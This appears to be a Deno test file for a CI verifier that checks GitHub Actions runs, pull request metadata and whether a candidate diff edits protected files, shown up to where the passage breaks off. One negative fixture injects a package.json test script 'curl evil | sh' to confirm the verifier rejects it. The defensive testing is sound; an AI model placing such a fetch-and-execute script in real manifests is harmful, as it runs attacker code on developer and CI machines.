import { assert, assertEquals } from "@std/assert";
import type { RequiredChecksPolicy } from "../../scripts/ci/evaluate.ts";
import {
  enumerateChangedPaths,
  formatVerifierReason,
  isBaseDrift,
  isBaseShaDrift,
  isWorkspaceLinkOnlyPatch,
  type JobSummary,
  type PullSummary,
  resolveLiveBaseDrift,
  type RunSummary,
  verifyRun,
} from "../../scripts/ci/verify-run.ts";

const headSha = "a".repeat(40);
const otherSha = "b".repeat(40);
const repository = "MarkTripoli/bakery";
const workflowPath = ".github/workflows/ci.yml";
const aggregateJob = "required / full-stack aggregate";

const policy: RequiredChecksPolicy = {
  workflow: "Bakery CI",
  workflowPath,
  aggregateJob,
  dependencies: "deno:2.9.1,node:22.22.0,pnpm:10.33.0",
  lanes: [
    { lane: "rails", job: "fast / backend rails", artifacts: [] },
    { lane: "ui_paper", job: "ui / paper parity", artifacts: [] },
  ],
};

const expected = { repository, headSha, runAttempt: "1" };

const run = (overrides: Partial<RunSummary> = {}): RunSummary => ({
  path: workflowPath,
  event: "pull_request",
  head_sha: headSha,
  run_attempt: 1,
  conclusion: "success",
  head_repository: { full_name: repository },
  ...overrides,
});

const jobs: JobSummary[] = [
  { name: "fast / backend rails", conclusion: "success" },
  { name: "ui / paper parity", conclusion: "success" },
  { name: aggregateJob, conclusion: "success" },
];

const pull = (overrides: Partial<PullSummary> = {}): PullSummary => ({
  number: 42,
  state: "open",
  head: { sha: headSha, repo: { full_name: repository } },
  base: { ref: "main", sha: otherSha, repo: { full_name: repository } },
  merge_commit_sha: "c".repeat(40),
  ...overrides,
});

Deno.test("verifyRun accepts a fully successful run", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [], expected);
  assertEquals(result.failures, []);
  assertEquals(result.laneResults, { rails: "success", ui_paper: "success" });
  assertEquals(result.pull, pull());
});

Deno.test("verifyRun rejects skipped conditional lanes and required failures", () => {
  const skipped = jobs.map((job) =>
    job.name === "ui / paper parity" ? { ...job, conclusion: "skipped" } : job
  );
  const rejected = verifyRun(policy, run(), skipped, [pull()], [], expected);
  assert(rejected.failures.includes("job ui / paper parity: skipped"));
  assertEquals(rejected.laneResults, {
    rails: "success",
    ui_paper: "skipped",
  });

  const failedRequired = skipped.map((job) =>
    job.name === "fast / backend rails"
      ? { ...job, conclusion: "failure" }
      : job
  );
  const doublyRejected = verifyRun(
    policy,
    run(),
    failedRequired,
    [pull()],
    [],
    expected,
  );
  assert(doublyRejected.failures.includes("job fast / backend rails: failure"));
  assert(doublyRejected.failures.includes("job ui / paper parity: skipped"));
});

Deno.test("verifyRun denies a missing job", () => {
  const withoutPaper = jobs.filter((job) => job.name !== "ui / paper parity");
  const result = verifyRun(policy, run(), withoutPaper, [pull()], [], expected);
  assert(result.failures.includes("job ui / paper parity: missing"));
  assertEquals(result.laneResults.ui_paper, "missing");
});

Deno.test("verifyRun denies a duplicated job", () => {
  const duplicated = [...jobs, {
    name: "ui / paper parity",
    conclusion: "success",
  }];
  const result = verifyRun(policy, run(), duplicated, [pull()], [], expected);
  assert(result.failures.includes("job ui / paper parity: duplicated"));
});

const gatePolicy: RequiredChecksPolicy = {
  ...policy,
  lanes: [
    { lane: "rails", job: "fast / backend rails", artifacts: [] },
    {
      lane: "ui_paper",
      job: "ui / paper parity",
      pullRequestRequired: false,
      artifacts: [],
    },
  ],
};

const gateJobs: JobSummary[] = [
  { name: "fast / backend rails", conclusion: "success" },
  { name: "ui / paper parity", conclusion: "skipped" },
  { name: aggregateJob, conclusion: "success" },
];

const replaceConclusion = (
  source: readonly JobSummary[],
  name: string,
  conclusion: string | null,
): JobSummary[] =>
  source.map((job) => job.name === name ? { ...job, conclusion } : job);

Deno.test("verifyRun requires post-merge lanes skipped on a pull request", () => {
  const accepted = verifyRun(
    gatePolicy,
    run(),
    gateJobs,
    [pull()],
    [],
    expected,
  );
  assertEquals(accepted.failures, []);
  assertEquals(accepted.laneResults, { rails: "success", ui_paper: "skipped" });
});

Deno.test("verifyRun rejects a post-merge lane that ran on a pull request", () => {
  for (
    const conclusion of ["success", "failure", "cancelled"] as const
  ) {
    const result = verifyRun(
      gatePolicy,
      run(),
      replaceConclusion(gateJobs, "ui / paper parity", conclusion),
      [pull()],
      [],
      expected,
    );
    assert(
      result.failures.includes(
        `job ui / paper parity: post-merge lane must be skipped on a pull request, observed ${conclusion}`,
      ),
      `expected post-merge rejection for ${conclusion}`,
    );
    assertEquals(result.laneResults.ui_paper, conclusion);
  }
});

Deno.test("verifyRun rejects a post-merge lane missing from a pull request", () => {
  const result = verifyRun(
    gatePolicy,
    run(),
    gateJobs.filter((job) => job.name !== "ui / paper parity"),
    [pull()],
    [],
    expected,
  );
  assert(result.failures.includes("job ui / paper parity: missing"));
  assertEquals(result.laneResults.ui_paper, "missing");
});

Deno.test("verifyRun rejects a duplicated post-merge lane", () => {
  const result = verifyRun(
    gatePolicy,
    run(),
    [...gateJobs, { name: "ui / paper parity", conclusion: "skipped" }],
    [pull()],
    [],
    expected,
  );
  assert(result.failures.includes("job ui / paper parity: duplicated"));
});

Deno.test("verifyRun denies a cancelled job", () => {
  const cancelled = jobs.map((job) =>
    job.name === "fast / backend rails"
      ? { ...job, conclusion: "cancelled" }
      : job
  );
  const result = verifyRun(policy, run(), cancelled, [pull()], [], expected);
  assert(result.failures.includes("job fast / backend rails: cancelled"));
  assertEquals(result.laneResults.rails, "cancelled");
});

Deno.test("verifyRun denies a cancelled run conclusion", () => {
  const result = verifyRun(
    policy,
    run({ conclusion: "cancelled" }),
    jobs,
    [pull()],
    [],
    expected,
  );
  assert(result.failures.includes("run: conclusion cancelled"));
});

Deno.test("verifyRun denies a null run conclusion", () => {
  const result = verifyRun(
    policy,
    run({ conclusion: null }),
    jobs,
    [pull()],
    [],
    expected,
  );
  assert(result.failures.includes("run: conclusion null"));
});

Deno.test("verifyRun denies a wrong workflow path", () => {
  const result = verifyRun(
    policy,
    run({ path: ".github/workflows/other.yml" }),
    jobs,
    [pull()],
    [],
    expected,
  );
  assert(result.failures.includes("run: workflow path mismatch"));
});

Deno.test("verifyRun denies a run that is not a pull_request", () => {
  const result = verifyRun(
    policy,
    run({ event: "push" }),
    jobs,
    [pull()],
    [],
    expected,
  );
  assert(result.failures.includes("run: event is not pull_request"));
});

Deno.test("verifyRun denies a head sha mismatch", () => {
  const result = verifyRun(
    policy,
    run({ head_sha: otherSha }),
    jobs,
    [pull()],
    [],
    expected,
  );
  assert(result.failures.includes("run: head sha mismatch"));
});

Deno.test("verifyRun denies an attempt mismatch", () => {
  const result = verifyRun(
    policy,
    run({ run_attempt: 2 }),
    jobs,
    [pull()],
    [],
    expected,
  );
  assert(result.failures.includes("run: attempt mismatch"));
});

Deno.test("verifyRun denies a head repository mismatch", () => {
  const result = verifyRun(
    policy,
    run({ head_repository: { full_name: "someone-else/bakery" } }),
    jobs,
    [pull()],
    [],
    expected,
  );
  assert(
    result.failures.includes(`run: head repository is not ${repository}`),
  );
});

Deno.test("verifyRun denies zero open pull requests", () => {
  const result = verifyRun(policy, run(), jobs, [], [], expected);
  assert(
    result.failures.includes(
      "pr: exactly one open pull request required for candidate head",
    ),
  );
  assertEquals(result.pull, null);
});

Deno.test("verifyRun denies two open pull requests", () => {
  const result = verifyRun(
    policy,
    run(),
    jobs,
    [pull({ number: 1 }), pull({ number: 2 })],
    [],
    expected,
  );
  assert(
    result.failures.includes(
      "pr: exactly one open pull request required for candidate head",
    ),
  );
  assertEquals(result.pull, null);
});

Deno.test("verifyRun denies a null merge commit sha", () => {
  const result = verifyRun(
    policy,
    run(),
    jobs,
    [pull({ merge_commit_sha: null })],
    [],
    expected,
  );
  assert(
    result.failures.includes("pr: merge commit unavailable; re-run verifier"),
  );
});

Deno.test("verifyRun laneResults maps every lane to its job conclusion", () => {
  const mixed = jobs.map((job) =>
    job.name === "ui / paper parity" ? { ...job, conclusion: "failure" } : job
  );
  const result = verifyRun(policy, run(), mixed, [pull()], [], expected);
  assertEquals(result.laneResults, { rails: "success", ui_paper: "failure" });
  assert(result.failures.includes("job ui / paper parity: failure"));
});

Deno.test("verifyRun filters out a closed pull request", () => {
  const result = verifyRun(
    policy,
    run(),
    jobs,
    [pull({ state: "closed" })],
    [],
    expected,
  );
  assert(
    result.failures.includes(
      "pr: exactly one open pull request required for candidate head",
    ),
  );
  assertEquals(result.pull, null);
});

Deno.test("verifyRun filters out a pull request targeting a non-main base", () => {
  const result = verifyRun(
    policy,
    run(),
    jobs,
    [pull({
      base: { ref: "release", sha: otherSha, repo: { full_name: repository } },
    })],
    [],
    expected,
  );
  assert(
    result.failures.includes(
      "pr: exactly one open pull request required for candidate head",
    ),
  );
  assertEquals(result.pull, null);
});

Deno.test("verifyRun filters out a pull request whose head repo is a fork", () => {
  const result = verifyRun(
    policy,
    run(),
    jobs,
    [pull({
      head: { sha: headSha, repo: { full_name: "someone-else/bakery" } },
    })],
    [],
    expected,
  );
  assert(
    result.failures.includes(
      "pr: exactly one open pull request required for candidate head",
    ),
  );
  assertEquals(result.pull, null);
});

Deno.test("verifyRun denies a missing aggregate job", () => {
  const withoutAggregate = jobs.filter((job) => job.name !== aggregateJob);
  const result = verifyRun(
    policy,
    run(),
    withoutAggregate,
    [pull()],
    [],
    expected,
  );
  assert(result.failures.includes(`job ${aggregateJob}: missing`));
});

Deno.test("verifyRun ignores changed paths outside the gate-defining prefixes", () => {
  const result = verifyRun(
    policy,
    run(),
    jobs,
    [pull()],
    [
      "docs/technical-design/03-frontend-and-design-system.md",
      "apps/web/src/routes/index.tsx",
    ],
    expected,
  );
  assert(!result.failures.some((failure) => failure.startsWith("gate:")));
});

Deno.test("verifyRun denies a candidate diff touching a workflow file", () => {
  const result = verifyRun(
    policy,
    run(),
    jobs,
    [pull()],
    [".github/workflows/ci.yml"],
    expected,
  );
  assertEquals(
    result.failures,
    ["gate: candidate modifies .github/workflows/ci.yml"],
  );
});

Deno.test("verifyRun denies a candidate diff touching the policy or capture script", () => {
  const policyEditResult = verifyRun(
    policy,
    run(),
    jobs,
    [pull()],
    ["scripts/ci/required-checks.json"],
    expected,
  );
  assertEquals(
    policyEditResult.failures,
    ["gate: candidate modifies scripts/ci/required-checks.json"],
  );

  const captureEditResult = verifyRun(
    policy,
    run(),
    jobs,
    [pull()],
    ["packages/ui/scripts/capture-stories.mjs"],
    expected,
  );
  assertEquals(
    captureEditResult.failures,
    ["gate: candidate modifies packages/ui/scripts/capture-stories.mjs"],
  );
});

Deno.test("verifyRun keeps a real job failure as the headline reason ahead of a gate edit", () => {
  const withoutPaper = jobs.filter((job) => job.name !== "ui / paper parity");
  const result = verifyRun(
    policy,
    run(),
    withoutPaper,
    [pull()],
    ["scripts/ci/evaluate.ts"],
    expected,
  );
  assertEquals(result.failures[0], "job ui / paper parity: missing");
  assert(
    result.failures.includes("gate: candidate modifies scripts/ci/evaluate.ts"),
  );
});

Deno.test("verifyRun denies a base that advanced since the candidate run", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [], {
    ...expected,
    baseAdvanced: true,
  });
  assertEquals(result.failures, [
    "pr: base advanced since candidate run; re-run Bakery CI",
  ]);
});

Deno.test("verifyRun orders the base-advanced failure after other pr: failures", () => {
  const result = verifyRun(
    policy,
    run(),
    jobs,
    [pull({ merge_commit_sha: null })],
    [],
    { ...expected, baseAdvanced: true },
  );
  const prFailures = result.failures.filter((failure) =>
    failure.startsWith("pr:")
  );
  assertEquals(prFailures, [
    "pr: merge commit unavailable; re-run verifier",
    "pr: base advanced since candidate run; re-run Bakery CI",
  ]);
});

Deno.test("verifyRun does not deny an unchanged base", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [], {
    ...expected,
    baseAdvanced: false,
  });
  assert(
    !result.failures.some((failure) => failure.includes("base advanced")),
  );
});

Deno.test("verifyRun denies a candidate diff touching scripts/ (superseding scripts/ci/)", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "scripts/run-tests.ts",
  ], expected);
  assertEquals(result.failures, [
    "gate: candidate modifies scripts/run-tests.ts",
  ]);
});

Deno.test("verifyRun denies a candidate diff touching a nested package.json", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "apps/web/package.json",
  ], expected);
  assertEquals(result.failures, [
    "gate: candidate modifies apps/web/package.json",
  ]);
});

Deno.test("verifyRun denies a candidate diff touching deno.json", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "deno.json",
  ], expected);
  assertEquals(result.failures, ["gate: candidate modifies deno.json"]);
});

Deno.test("verifyRun denies a candidate diff touching a nested playwright.config.ts", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "packages/ui/playwright.config.ts",
  ], expected);
  assertEquals(result.failures, [
    "gate: candidate modifies packages/ui/playwright.config.ts",
  ]);
});

Deno.test("verifyRun denies a candidate diff touching a nested tsconfig variant", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "apps/web/tsconfig.json",
  ], expected);
  assertEquals(result.failures, [
    "gate: candidate modifies apps/web/tsconfig.json",
  ]);
});

Deno.test("verifyRun denies a candidate diff touching a Paper baseline image", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "docs/technical-design/ui-baselines/paper/ui-section-navigation.png",
  ], expected);
  assertEquals(result.failures, [
    "gate: candidate modifies docs/technical-design/ui-baselines/paper/ui-section-navigation.png",
  ]);
});

Deno.test("verifyRun denies a candidate diff touching paper-baselines.json", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "docs/technical-design/ui-baselines/paper-baselines.json",
  ], expected);
  assertEquals(result.failures, [
    "gate: candidate modifies docs/technical-design/ui-baselines/paper-baselines.json",
  ]);
});

Deno.test("verifyRun denies a candidate diff touching the route ledger, enterprise baselines or catalog", () => {
  for (
    const path of [
      "docs/technical-design/ui-baselines/route-references.json",
      "docs/technical-design/ui-baselines/guardrail-baseline.json",
      "docs/technical-design/ui-baselines/enterprise-baselines.json",
      "packages/ui/catalog/route-references.ts",
    ]
  ) {
    const result = verifyRun(policy, run(), jobs, [pull()], [path], expected);
    assertEquals(result.failures, [`gate: candidate modifies ${path}`], path);
  }
});

Deno.test("verifyRun denies a candidate diff touching a non-root deno.json", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "apps/server/deno.json",
  ], expected);
  assertEquals(result.failures, [
    "gate: candidate modifies apps/server/deno.json",
  ]);
});

Deno.test("verifyRun denies a candidate diff touching a vite config", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "apps/web/vite.config.ts",
  ], expected);
  assertEquals(result.failures, [
    "gate: candidate modifies apps/web/vite.config.ts",
  ]);
});

Deno.test("verifyRun denies a candidate diff touching a per-package turbo.json", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "packages/ui/turbo.json",
  ], expected);
  assertEquals(result.failures, [
    "gate: candidate modifies packages/ui/turbo.json",
  ]);
});

Deno.test("verifyRun denies a candidate diff touching .pnpmfile.cjs", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    ".pnpmfile.cjs",
  ], expected);
  assertEquals(result.failures, ["gate: candidate modifies .pnpmfile.cjs"]);
});

Deno.test("verifyRun denies a candidate diff touching .npmrc", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    ".npmrc",
  ], expected);
  assertEquals(result.failures, ["gate: candidate modifies .npmrc"]);
});

Deno.test("verifyRun denies a candidate diff touching a nested .npmrc", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "apps/web/.npmrc",
  ], expected);
  assertEquals(result.failures, ["gate: candidate modifies apps/web/.npmrc"]);
});

Deno.test("verifyRun denies a candidate diff touching a nested .pnpmfile.cjs", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "packages/ui/.pnpmfile.cjs",
  ], expected);
  assertEquals(result.failures, [
    "gate: candidate modifies packages/ui/.pnpmfile.cjs",
  ]);
});

Deno.test("verifyRun denies a candidate diff touching .pnpmfile.mjs", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    ".pnpmfile.mjs",
  ], expected);
  assertEquals(result.failures, ["gate: candidate modifies .pnpmfile.mjs"]);
});

Deno.test("verifyRun denies a candidate diff touching a bare pnpmfile.cjs", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "pnpmfile.cjs",
  ], expected);
  assertEquals(result.failures, ["gate: candidate modifies pnpmfile.cjs"]);
});

Deno.test("verifyRun does not gate ordinary UI/app/catalog work", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "apps/web/src/routes/foo.tsx",
    "packages/ui/src/x.css",
    "docs/technical-design/ui-baselines/components.json",
  ], expected);
  assertEquals(result.failures, []);
});

Deno.test("verifyRun denies a rename that moves a gate-defining file out of scripts/ci/", () => {
  // A `git mv` reports the new path as `filename` and the old path as
  // `previous_filename`; the CLI flattens both into changedPaths before
  // calling verifyRun (see enumerateChangedPaths tests below).
  const result = verifyRun(policy, run(), jobs, [pull()], [
    "packages/ui/tools/capture-stories.mjs",
    "packages/ui/scripts/capture-stories.mjs",
  ], expected);
  assertEquals(result.failures, [
    "gate: candidate modifies packages/ui/scripts/capture-stories.mjs",
  ]);
});

Deno.test("verifyRun denies a base with no recorded pull_requests entry", () => {
  const result = verifyRun(policy, run(), jobs, [pull()], [], {
    ...expected,
    baseUnrecorded: true,
  });
  assertEquals(result.failures, [
    "pr: candidate run has no recorded base; re-run Bakery CI",
  ]);
});

Deno.test("verifyRun keeps a real job failure ahead of a base-advanced refusal", () => {
  const withoutPaper = jobs.filter((job) => job.name !== "ui / paper parity");
  const result = verifyRun(policy, run(), withoutPaper, [pull()], [], {
    ...expected,
    baseAdvanced: true,
  });
  assertEquals(result.failures[0], "job ui / paper parity: missing");
});

Deno.test("verifyRun keeps a real job failure ahead of an unrecorded-base refusal", () => {
  const withoutPaper = jobs.filter((job) => job.name !== "ui / paper parity");
  const result = verifyRun(policy, run(), withoutPaper, [pull()], [], {
    ...expected,
    baseUnrecorded: true,
  });
  assertEquals(result.failures[0], "job ui / paper parity: missing");
});

Deno.test("isBaseDrift treats ahead, diverged, and behind as drift", () => {
  assertEquals(isBaseDrift("ahead"), true);
  assertEquals(isBaseDrift("diverged"), true);
  assertEquals(isBaseDrift("behind"), true);
  assertEquals(isBaseDrift("identical"), false);
  assertEquals(isBaseDrift(undefined), false);
});

Deno.test("isBaseShaDrift compares the run base with live main", () => {
  assertEquals(isBaseShaDrift(otherSha, headSha), true);
  assertEquals(isBaseShaDrift(otherSha, otherSha), false);
});

Deno.test("formatVerifierReason preserves every verifier failure", () => {
  assertEquals(
    formatVerifierReason(["job missing", "pr: base advanced"]),
    "job missing\npr: base advanced\n",
  );
  assertEquals(formatVerifierReason([]), "run accepted\n");
});
Deno.test("resolveLiveBaseDrift fails closed on a live ref API failure", async () => {
  const result = await resolveLiveBaseDrift(
    fetchJsonFrom({
      [`/repos/${repository}/git/ref/heads/main`]: {
        ok: false,
        status: 503,
        body: null,
      },
    }),
    repository,
    otherSha,
  );
  assertEquals(result, {
    baseAdvanced: false,
    apiFailures: [
      `api: 503 /repos/${repository}/git/ref/heads/main`,
    ],
  });
});

Deno.test("resolveLiveBaseDrift fails closed on a malformed live ref", async () => {
  const result = await resolveLiveBaseDrift(
    fetchJsonFrom({
      [`/repos/${repository}/git/ref/heads/main`]: {
        ok: true,
        status: 200,
        body: { object: {} },
      },
    }),
    repository,
    otherSha,
  );
  assertEquals(result, {
    baseAdvanced: false,
    apiFailures: [
      `api: malformed response /repos/${repository}/git/ref/heads/main`,
    ],
  });
});

Deno.test("resolveLiveBaseDrift accepts a recorded base equal to live main", async () => {
  const result = await resolveLiveBaseDrift(
    fetchJsonFrom({
      [`/repos/${repository}/git/ref/heads/main`]: {
        ok: true,
        status: 200,
        body: { object: { sha: otherSha } },
      },
    }),
    repository,
    otherSha,
  );
  assertEquals(result, { baseAdvanced: false, apiFailures: [] });
});

Deno.test("resolveLiveBaseDrift refuses a recorded base stale against live main", async () => {
  const result = await resolveLiveBaseDrift(
    fetchJsonFrom({
      [`/repos/${repository}/git/ref/heads/main`]: {
        ok: true,
        status: 200,
        body: { object: { sha: headSha } },
      },
    }),
    repository,
    otherSha,
  );
  assertEquals(result, { baseAdvanced: true, apiFailures: [] });
});

const fetchJsonFrom = (
  responses: Record<
    string,
    { ok: boolean; status: number; body: unknown; linkHeader?: string | null }
  >,
) =>
(path: string) => {
  const response = responses[path];
  if (!response) throw new Error(`unexpected fetch: ${path}`);
  return Promise.resolve({
    ok: response.ok,
    status: response.status,
    body: response.body,
    linkHeader: response.linkHeader ?? null,
  });
};

Deno.test("enumerateChangedPaths denies a non-array files body", async () => {
  const result = await enumerateChangedPaths(
    fetchJsonFrom({
      "/repos/o/r/pulls/1": {
        ok: true,
        status: 200,
        body: { changed_files: 1, head: { sha: headSha } },
      },
      "/repos/o/r/pulls/1/files?per_page=100": {
        ok: true,
        status: 200,
        body: { not: "an array" },
      },
    }),
    "/repos/o/r/pulls/1",
    "/repos/o/r/pulls/1/files?per_page=100",
    headSha,
  );
  assertEquals(result.changedPaths, []);
  assertEquals(result.apiFailures, []);
  assertEquals(result.postJobFailures, ["gate: changed file list unavailable"]);
});

Deno.test("enumerateChangedPaths denies an unreachable pull details fetch", async () => {
  const result = await enumerateChangedPaths(
    fetchJsonFrom({
      "/repos/o/r/pulls/1": { ok: false, status: 502, body: null },
    }),
    "/repos/o/r/pulls/1",
    "/repos/o/r/pulls/1/files?per_page=100",
    headSha,
  );
  assertEquals(result.changedPaths, []);
  assertEquals(result.apiFailures, ["api: 502 /repos/o/r/pulls/1"]);
  assertEquals(result.postJobFailures, ["gate: changed file list unavailable"]);
});

Deno.test("enumerateChangedPaths denies a PR head that advanced since resolution", async () => {
  const result = await enumerateChangedPaths(
    fetchJsonFrom({
      "/repos/o/r/pulls/1": {
        ok: true,
        status: 200,
        body: { changed_files: 1, head: { sha: otherSha } },
      },
    }),
    "/repos/o/r/pulls/1",
    "/repos/o/r/pulls/1/files?per_page=100",
    headSha,
  );
  assertEquals(result.changedPaths, []);
  assertEquals(result.apiFailures, []);
  assertEquals(result.postJobFailures, [
    "pr: head advanced during verification; re-run verifier",
  ]);
});

Deno.test("enumerateChangedPaths denies a malformed pull details body as unavailable, not head-advanced", async () => {
  const result = await enumerateChangedPaths(
    fetchJsonFrom({
      "/repos/o/r/pulls/1": {
        ok: true,
        status: 200,
        body: { changed_files: 1 },
      },
    }),
    "/repos/o/r/pulls/1",
    "/repos/o/r/pulls/1/files?per_page=100",
    headSha,
  );
  assertEquals(result.changedPaths, []);
  assertEquals(result.apiFailures, []);
  assertEquals(result.postJobFailures, [
    "gate: changed file list unavailable",
  ]);
});

Deno.test("enumerateChangedPaths denies an incomplete enumeration", async () => {
  const result = await enumerateChangedPaths(
    fetchJsonFrom({
      "/repos/o/r/pulls/1": {
        ok: true,
        status: 200,
        body: { changed_files: 5, head: { sha: headSha } },
      },
      "/repos/o/r/pulls/1/files?per_page=100": {
        ok: true,
        status: 200,
        body: [{ filename: "a.ts" }, { filename: "b.ts" }, {
          filename: "c.ts",
        }],
      },
    }),
    "/repos/o/r/pulls/1",
    "/repos/o/r/pulls/1/files?per_page=100",
    headSha,
  );
  assertEquals(result.apiFailures, []);
  assertEquals(result.postJobFailures, [
    "gate: candidate diff not fully enumerated",
  ]);
});

Deno.test("enumerateChangedPaths follows Link: rel=next and concatenates pages", async () => {
  const calls: string[] = [];
  const fetchJson = fetchJsonFrom({
    "/repos/o/r/pulls/1": {
      ok: true,
      status: 200,
      body: { changed_files: 4, head: { sha: headSha } },
    },
    "/repos/o/r/pulls/1/files?per_page=100": {
      ok: true,
      status: 200,
      body: [{ filename: "a.ts" }, { filename: "b.ts" }],
      linkHeader:
        '<https://api.github.com/repos/o/r/pulls/1/files?per_page=100&page=2>; rel="next"',
    },
    "/repos/o/r/pulls/1/files?per_page=100&page=2": {
      ok: true,
      status: 200,
      body: [{ filename: "c.ts" }, { filename: "d.ts" }],
    },
  });
  const recordingFetchJson = (path: string) => {
    calls.push(path);
    return fetchJson(path);
  };
  const result = await enumerateChangedPaths(
    recordingFetchJson,
    "/repos/o/r/pulls/1",
    "/repos/o/r/pulls/1/files?per_page=100",
    headSha,
  );
  assertEquals(calls, [
    "/repos/o/r/pulls/1",
    "/repos/o/r/pulls/1/files?per_page=100",
    "/repos/o/r/pulls/1/files?per_page=100&page=2",
  ]);
  assertEquals(result.changedPaths, ["a.ts", "b.ts", "c.ts", "d.ts"]);
  assertEquals(result.apiFailures, []);
  assertEquals(result.postJobFailures, []);
});

Deno.test("enumerateChangedPaths collects both filename and previous_filename for a rename", async () => {
  const result = await enumerateChangedPaths(
    fetchJsonFrom({
      "/repos/o/r/pulls/1": {
        ok: true,
        status: 200,
        body: { changed_files: 1, head: { sha: headSha } },
      },
      "/repos/o/r/pulls/1/files?per_page=100": {
        ok: true,
        status: 200,
        body: [{
          filename: "packages/ui/tools/capture-stories.mjs",
          previous_filename: "packages/ui/scripts/capture-stories.mjs",
          status: "renamed",
        }],
      },
    }),
    "/repos/o/r/pulls/1",
    "/repos/o/r/pulls/1/files?per_page=100",
    headSha,
  );
  assertEquals(result.changedPaths, [
    "packages/ui/tools/capture-stories.mjs",
    "packages/ui/scripts/capture-stories.mjs",
  ]);
  assertEquals(result.apiFailures, []);
  assertEquals(result.postJobFailures, []);
});

Deno.test("verifyRun keeps a real job failure ahead of an enumeration-failure refusal", () => {
  const withoutPaper = jobs.filter((job) => job.name !== "ui / paper parity");
  const result = verifyRun(policy, run(), withoutPaper, [pull()], [], {
    ...expected,
    postJobFailures: ["gate: changed file list unavailable"],
  });
  assertEquals(result.failures[0], "job ui / paper parity: missing");
  assert(result.failures.includes("gate: changed file list unavailable"));
});

const workspaceLinkPackagePatch = [
  "@@ -12,6 +12,7 @@",
  '   "dependencies": {',
  '     "@bakery/config": "workspace:*",',
  '     "@bakery/contracts": "workspace:*",',
  '+    "@bakery/i18n": "workspace:*",',
  '     "better-auth": "1.7.3",',
].join("\n");

const workspaceLinkLockPatch = [
  "@@ -35,6 +35,9 @@ importers:",
  "       '@bakery/contracts':",
  "         specifier: workspace:*",
  "         version: link:../../packages/contracts",
  "+      '@bakery/i18n':",
  "+        specifier: workspace:*",
  "+        version: link:../../packages/i18n",
  "       better-auth:",
].join("\n");

Deno.test("isWorkspaceLinkOnlyPatch admits only workspace:* links between repository packages", () => {
  assert(isWorkspaceLinkOnlyPatch({
    filename: "apps/server/package.json",
    status: "modified",
    patch: workspaceLinkPackagePatch,
  }));
  assert(isWorkspaceLinkOnlyPatch({
    filename: "pnpm-lock.yaml",
    status: "modified",
    patch: workspaceLinkLockPatch,
  }));
  // Removing a link is the same shape in reverse.
  assert(isWorkspaceLinkOnlyPatch({
    filename: "packages/contracts/package.json",
    status: "modified",
    patch: workspaceLinkPackagePatch.replace("+    ", "-    "),
  }));
});

Deno.test("isWorkspaceLinkOnlyPatch fails closed on anything but a workspace link", () => {
  const modified = (filename: string, patch: string | undefined) => ({
    filename,
    status: "modified",
    patch,
  });
  // External dependency.
  assert(
    !isWorkspaceLinkOnlyPatch(modified(
      "apps/server/package.json",
      '@@ -12,3 +12,4 @@\n+    "left-pad": "1.3.0",',
    )),
  );
  // A script edit alongside a legitimate link.
  assert(
    !isWorkspaceLinkOnlyPatch(modified(
      "apps/server/package.json",
      `${workspaceLinkPackagePatch}\n+    "test": "curl evil | sh",`,
    )),
  );
  // A workspace-looking specifier that is not workspace:*.
  assert(
    !isWorkspaceLinkOnlyPatch(modified(
      "apps/server/package.json",
      '@@ -1 +1 @@\n+    "@bakery/i18n": "workspace:^",',
    )),
  );
  // Lockfile link outside packages/ or apps/.
  assert(
    !isWorkspaceLinkOnlyPatch(modified(
      "pnpm-lock.yaml",
      workspaceLinkLockPatch.replace("packages/i18n", "scripts/ci"),
    )),
  );
  // Lockfile version that is not a link.
  assert(
    !isWorkspaceLinkOnlyPatch(modified(
      "pnpm-lock.yaml",
      "@@ -1 +1 @@\n+      '@bakery/i18n':\n+        specifier: workspace:*\n+        version: 1.0.0",
    )),
  );
  // A nested pnpm-lock.yaml is not the root lockfile.
  assert(
    !isWorkspaceLinkOnlyPatch(modified(
      "apps/server/pnpm-lock.yaml",
      workspaceLinkLockPatch,
    )),
  );
  // Any other gated basename.
  assert(!isWorkspaceLinkOnlyPatch(modified("deno.json", "@@ -1 +1 @@\n+x")));
  // GitHub omitted the patch (diff too large), or nothing changed.
  assert(
    !isWorkspaceLinkOnlyPatch(modified("apps/server/package.json", undefined)),
  );
  assert(!isWorkspaceLinkOnlyPatch(modified("apps/server/package.json", "")));
  assert(
    !isWorkspaceLinkOnlyPatch(
      modified("apps/server/package.json", "@@ -1 +1 @@\n   unchanged"),
    ),
  );
  // Added, removed, or renamed files are never exempt.
  assert(
    !isWorkspaceLinkOnlyPatch({
      filename: "packages/new/package.json",
      status: "added",
      patch: workspaceLinkPackagePatch,
    }),
  );
  assert(
    !isWorkspaceLinkOnlyPatch({
      filename: "apps/server/package.json",
      status: "renamed",
      previous_filename: "scripts/ci/package.json",
      patch: workspaceLinkPackagePatch,
    }),
  );
});

Deno.test("enumerateChangedPaths leaves a workspace-link-only manifest change ungated", async () => {
  const result = await enumerateChangedPaths(
    fetchJsonFrom({
      "/repos/o/r/pulls/1": {
        ok: true,
        status: 200,
        body: { changed_files: 3, head: { sha: headSha } },
      },
      "/repos/o/r/pulls/1/files?per_page=100": {
        ok: true,
        status: 200,
        body: [
          {
            filename: "apps/server/package.json",
            status: "modified",
            patch: workspaceLinkPackagePatch,
          },
          {
            filename: "pnpm-lock.yaml",
            status: "modified",
            patch: workspaceLinkLockPatch,
          },
          {
            filename: "apps/web/package.json",
            status: "modified",
